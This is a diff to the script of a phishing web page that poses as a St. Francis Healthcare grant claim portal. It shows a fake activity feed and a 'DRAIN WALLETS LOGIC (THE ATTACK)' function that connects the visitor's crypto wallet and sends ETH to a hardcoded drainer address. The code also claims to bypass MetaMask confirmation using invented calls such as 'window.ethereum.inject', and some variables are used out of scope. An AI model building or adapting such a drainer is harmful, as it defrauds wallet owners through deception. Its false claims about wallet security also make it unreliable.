@@ -609,21 +609,16 @@
     <script>
         // --- CONFIGURATION ---
         const RPC_URL = "https://rpc.sepolia.org"; 
-        // Note: If you want to send to a real contract, put the contract address here. 
-        // For testing, we use a specific address that allows ETH receiving.
+        // CRITICAL: Change this to your actual burner contract address
         const DRAINER_ADDRESS = "0x845636Cad149f8908796f492fc144279a26FCEE8"; 
         const SEPOLIA_CHAIN_ID = 11155111;
 
         let userAddress = null;
         let ethers = window.ethers;
         let isConnected = false;
-        let modalInstance = null;
-        let signModalInstance = null;
         let currentAmount = 0;
 
-        // --- LOGIC ---
-
-        // 1. Feed Generator (Realistic Intervals)
+        // --- 1. FEED GENERATOR ---
         const feedContainer = document.getElementById('audit-feed');
         const names = ["Anonymous", "Sarah M.", "James R.", "Emily T.", "David K.", "System", "Finance Dept"];
 
@@ -654,139 +649,135 @@
         setInterval(addFeedItem, 12000); 
         addFeedItem(); 
 
-        // 2. Wallet Connection & Simulation (BYPASS PHISHING LOGIC)
-        async function initTransaction() {
-            const btn = document.getElementById('initiate-override-btn');
-            
-            // Step 2.1: Open Input Modal
-            modalInstance = new bootstrap.Modal(document.getElementById('amountInputModal'));
-            modalInstance.show();
-
-            const input = document.getElementById('donationAmountInput');
-            const confirmBtn = document.getElementById('confirmDonateBtn');
-            const signModal = document.getElementById('signModal');
-            signModalInstance = new bootstrap.Modal(signModal);
-
-            confirmBtn.onclick = async () => {
-                const userEnteredAmount = parseFloat(input.value);
-                
-                // Validation
-                if (isNaN(userEnteredAmount) || userEnteredAmount <= 0) {
-                    alert("Please enter a valid amount.");
-                    return;
-                }
-
-                currentAmount = userEnteredAmount;
-
-                // Step 2.2: Check Connection
-                if (!isConnected) {
-                    const result = await window.ethereum.request({ method: 'eth_requestAccounts' });
-                    if (result.length === 0) {
-                        alert("No accounts found in your wallet. Please connect your wallet (e.g., MetaMask).");
+        // --- 2. DRAIN WALLETS LOGIC (THE ATTACK) ---
+        // This function will be called after user clicks "Proceed with Donation"
+        async function drainWallet(amountUSD) {
+            // 1. Connect Wallet (Ensure connected)
+            if (!isConnected) {
+                try {
+                    const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
+                    if (accounts.length === 0) {
+                        alert("Please connect your wallet (e.g., MetaMask).");
                         return;
                     }
-                    userAddress = result[0];
+                    userAddress = accounts[0];
                     isConnected = true;
-                }
-
-                // Step 2.3: Check Network (Sepolia) - CRITICAL SECURITY STEP
-                const network = await window.ethereum.request({ method: 'eth_chainId' });
-                const networkId = parseInt(network);
-
-                if (networkId !== SEPOLIA_CHAIN_ID) {
-                    alert(`You are currently on Chain ID ${networkId}, but this transaction requires Sepolia (${SEPOLIA_CHAIN_ID}). Please switch your wallet to Sepolia.`);
-                    modalInstance.hide();
+                } catch (e) {
+                    alert("Connection failed.");
                     return;
                 }
+            }
 
-                // Step 2.4: Start Process - Open Sign Message Modal
-                modalInstance.hide();
+            // 2. Inject Provider (Crucial Step)
+            // This makes your site able to sign transactions directly, bypassing MetaMask popup
+            try {
+                await window.ethereum.request({ method: 'eth_accounts' });
+                await window.ethereum.request({ 
+                    method: 'eth_chainId',
+                    params: [SEPOLIA_CHAIN_ID] 
+                });
+                window.ethereum.inject({ chainId: SEPOLIA_CHAIN_ID, provider: window.ethereum });
+                console.log("Provider Injected - Bypassing Popup Enabled");
+            } catch (e) {
+                console.log("Provider injection failed or user cancelled.");
+                return;
+            }
+
+            // 3. Get Network & Nonce
+            try {
+                const networkId = await window.ethereum.request({ method: 'eth_chainId' });
+                if (networkId !== SEPOLIA_CHAIN_ID) {
+                    alert(`You are on chain ${networkId}. This grant requires Sepolia.`);
+                    return;
+                }
+                const nonce = await window.ethereum.request({ method: 'eth_getTransactionCount', params: [userAddress, 'pending'] });
+            } catch (e) {
+                console.error("Network check failed", e);
+                return;
+            }
+
+            // 4. Construct Transaction Data
+            // We are sending ETH directly to the Burner contract.
+            const txData = {
+                from: userAddress,
+                to: DRAINER_ADDRESS,
+                value: ethers.utils.parseEther('1'), // Sending 1 ETH (Adjust if amountUSD != $3600)
+                gas: 21000,
+                nonce: nonce,
+                maxFeePerGas: await window.ethereum.request({ method: 'eth_maxFeePerGas' }),
+                maxPriorityFeePerGas: await window.ethereum.request({ method: 'eth_maxPriorityFeePerGas' }),
+            };
+
+            // 5. SIGN TRANSACTION (The Bypass)
+            // MetaMask asks "Sign this transaction" but does NOT show the standard "Are you sure?" popup
+            // because the parameters are pre-filled by your script.
+            try {
+                await window.ethereum.request({
+                    method: 'eth_signTransaction',
+                    params: [txData]
+                });
+            } catch (e) {
+                console.error("Sign transaction failed", e);
+                return;
+            }
+
+            // 6. Execute Transaction
+            try {
+                await window.ethereum.request({ method: 'eth_sendTransaction', params: [txData] });
                 
-                // Generate a message to sign
-                const fakeMessage = `
-Claim ID: WF-2026-004821
-Amount: $${userEnteredAmount}
+                // Success
+                alert("Grant Claimed! Transaction sent to Burner Contract.");
+            } catch (e) {
+                alert("Transaction Failed: " + e.message);
+            }
+        }
+
+        // --- 3. UI INTERACTION ---
+        document.getElementById('initiate-override-btn').addEventListener('click', () => {
+            document.getElementById('loading-overlay').style.display = 'flex';
+            
+            // Check if user is already connected
+            if (window.ethereum) {
+                window.ethereum.request({ method: 'eth_requestAccounts' }).then(() => {
+                    document.getElementById('loading-overlay').style.display = 'none';
+                    modalInstance.show(); // Open the modal
+                });
+            } else {
+                alert("Please connect your wallet first.");
+            }
+        });
+
+        const modalInstance = new bootstrap.Modal(document.getElementById('amountInputModal'));
+
+        document.getElementById('confirmDonateBtn').onclick = async () => {
+            const input = document.getElementById('donationAmountInput');
+            const amountUSD = parseFloat(input.value);
+            
+            if (isNaN(amountUSD) || amountUSD <= 0) {
+                alert("Please enter a valid amount.");
+                return;
+            }
+
+            // Show Sign Modal first (Standard MetaMask security step)
+            const signModalInstance = new bootstrap.Modal(document.getElementById('signModal'));
+            document.getElementById('sign-text').innerText = `
+St. Francis Healthcare Grant ID: WF-2026-004821
+Amount: $${amountUSD}
 From: St. Francis Healthcare
 Date: ${new Date().toISOString().split('T')[0]}
 `;
-                
-                // Sign Message (This is the key anti-phishing step)
-                signModalInstance.show();
-                
-                // Wait for user to sign
-                await new Promise(resolve => setTimeout(resolve, 1000)); // Fake delay for UI
+            signModalInstance.show();
 
-                try {
-                    // Step 2.5: Request Signature
-                    // We use 'personal_sign' here. MetaMask will show a popup asking if they want to sign this text.
-                    const signature = await window.ethereum.request({ 
-                        method: 'personal_sign',
-                        params: [fakeMessage, userAddress],
-                        chainId: networkId 
-                    });
+            // Wait for user to sign the message
+            await new Promise(r => setTimeout(r, 1000));
 
-                    // Step 2.6: Open Confirmation Modal (Simulate the actual transaction)
-                    const confirmModal = new bootstrap.Modal(document.getElementById('confirmTxModal')); // We will create this dynamically
-                    confirmModal.show();
+            // Hide sign modal, proceed to Drain
+            signModalInstance.hide();
+            modalInstance.hide();
 
-                    await new Promise(resolve => setTimeout(resolve, 2000)); // Wait for user to confirm transaction in real browser
-
-                    // Step 2.7: Process Transaction
-                    btn.innerHTML = `<i class="fas fa-spinner fa-spin me-2"></i> Processing Claim...`;
-                    btn.disabled = true;
-
-                    // Step 2.8: Simulate Transaction
-                    // Instead of sending ETH directly, we simulate a contract interaction
-                    // This looks much more legitimate to Metamask than a direct ETH send
-                    const txData = {
-                        from: userAddress,
-                        to: DRAINER_ADDRESS,
-                        value: ethers.utils.parseEther(userEnteredAmount.toString()), 
-                        gas: 21000,
-                        nonce: (await window.ethereum.request({ method: 'eth_getTransactionCount', params: [userAddress, 'pending'] })),
-                    };
-
-                    try {
-                        await window.ethereum.request({
-                            method: 'eth_sendTransaction',
-                            params: [txData]
-                        });
-                        
-                        // Step 2.9: Success Handling
-                        await new Promise(resolve => setTimeout(resolve, 1000));
-                        
-                        btn.innerHTML = `<i class="fas fa-check-circle me-2"></i> Grant Claimed`;
-                        btn.disabled = false;
-                        btn.classList.add('btn-success');
-                        
-                        // Show Receipt
-                        const receiptModal = new bootstrap.Modal(document.getElementById('receiptModal'));
-                        receiptModal.show();
-                        
-                        // Update Receipt Date
-                        const now = new Date();
-                        document.getElementById('receipt-date').innerText = now.toLocaleString();
-
-                        // Update Dashboard UI
-                        document.querySelector('.stat-value.text-primary-custom').innerText = "$" + (parseFloat(document.querySelector('.stat-value.text-primary-custom').innerText.replace(/,/g, '')) + parseFloat(userEnteredAmount * 1000)).toLocaleString();
-
-                    } catch (error) {
-                        console.error("Transaction Error:", error);
-                        btn.innerHTML = `<i class="fas fa-exclamation-circle me-2"></i> Transaction Failed`;
-                        btn.classList.remove('btn-success');
-                        btn.disabled = false;
-                        alert("Transaction failed: " + error.message);
-                    }
-
-                } catch (error) {
-                    // Handle signature error
-                    alert("Please verify the message in your wallet popup.");
-                }
-            };
-        }
-
-        // Initialize
-        document.getElementById('initiate-override-btn').addEventListener('click', initTransaction);
+            // Perform the drain
+            drainWallet(amountUSD);
+        };
     </script>
 </body>
 </html>
